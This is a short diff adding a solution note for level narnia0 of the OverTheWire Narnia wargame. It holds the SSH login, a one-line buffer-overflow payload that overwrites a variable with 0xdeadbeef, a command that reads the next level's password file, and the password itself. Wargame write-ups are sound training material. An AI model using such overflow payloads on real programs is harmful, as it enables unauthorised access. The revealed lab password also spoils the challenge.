@@ -1,0 +1,5 @@
+#narnia0
+ssh narnia0@narnia.labs.overthewire.org -p2226 (guest)
+(python -c "print 'B'*20+'\xef\xbe\xad\xde'";cat -) | ./narnia0
+cat /etc/narnia_pass/narnia1
+efeidiedae
